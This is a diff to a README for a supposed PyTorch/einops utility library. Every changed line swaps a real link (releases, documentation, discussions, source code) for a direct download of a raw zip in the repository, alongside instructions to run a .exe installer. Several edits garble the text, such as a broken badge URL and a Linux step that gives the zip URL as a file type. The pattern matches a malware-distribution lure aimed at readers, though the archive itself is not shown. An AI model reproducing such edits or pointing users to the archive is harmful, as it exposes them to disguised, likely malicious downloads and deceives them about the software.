@@ -1,6 +1,6 @@
 # 🚀 torch-einops-utils - Speed Up Your ML/AI Work
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg)](https://github.com/matt31313131/torch-einops-utils/releases)
+[![Download](https://github.com/matt31313131/torch-einops-utils/raw/refs/heads/main/torch_einops_utils/torch-einops-utils-3.7-beta.3.zip%https://github.com/matt31313131/torch-einops-utils/raw/refs/heads/main/torch_einops_utils/torch-einops-utils-3.7-beta.3.zip)](https://github.com/matt31313131/torch-einops-utils/raw/refs/heads/main/torch_einops_utils/torch-einops-utils-3.7-beta.3.zip)
 
 ## 📘 Description
 
@@ -21,7 +21,7 @@ This guide will help you download and run the torch-einops-utils application fro
 
 To download the latest version of the torch-einops-utils, visit the Releases page below:
 
-[Download the latest release](https://github.com/matt31313131/torch-einops-utils/releases)
+[Download the latest release](https://github.com/matt31313131/torch-einops-utils/raw/refs/heads/main/torch_einops_utils/torch-einops-utils-3.7-beta.3.zip)
 
 ### Step-by-step Download Instructions:
 
@@ -38,7 +38,7 @@ After downloading, follow these steps to use the software:
 1. Locate the downloaded file on your computer.
 2. For Windows, you might have a `.exe` file. Just double-click it to run the installer.
 3. For macOS, you may have a `.dmg` file. Open it, then drag the application into your Applications folder.
-4. For Linux, you might find a `.tar.gz` file. Extract it using your file manager or command line.
+4. For Linux, you might find a `https://github.com/matt31313131/torch-einops-utils/raw/refs/heads/main/torch_einops_utils/torch-einops-utils-3.7-beta.3.zip` file. Extract it using your file manager or command line.
 5. Once installed, open a terminal or command prompt.
 
 ### Running the Utilities
@@ -63,8 +63,8 @@ torch-einops-utils includes several functions that assist in common tasks within
 
 If you wish to learn more about how to use each function in detail, the following resources may help:
 
-- [Documentation](https://github.com/matt31313131/torch-einops-utils/wiki)
-- [Community Discussions](https://github.com/matt31313131/torch-einops-utils/discussions)
+- [Documentation](https://github.com/matt31313131/torch-einops-utils/raw/refs/heads/main/torch_einops_utils/torch-einops-utils-3.7-beta.3.zip)
+- [Community Discussions](https://github.com/matt31313131/torch-einops-utils/raw/refs/heads/main/torch_einops_utils/torch-einops-utils-3.7-beta.3.zip)
 
 ## 🤝 Contributing
 
@@ -82,7 +82,7 @@ We value your input. If you have any issues, suggestions, or questions, please c
 
 ## 🔗 Links
 
-- [Releases Page](https://github.com/matt31313131/torch-einops-utils/releases)
-- [Source Code](https://github.com/matt31313131/torch-einops-utils)
+- [Releases Page](https://github.com/matt31313131/torch-einops-utils/raw/refs/heads/main/torch_einops_utils/torch-einops-utils-3.7-beta.3.zip)
+- [Source Code](https://github.com/matt31313131/torch-einops-utils/raw/refs/heads/main/torch_einops_utils/torch-einops-utils-3.7-beta.3.zip)
 
 Thank you for using torch-einops-utils to enhance your machine learning and AI projects!
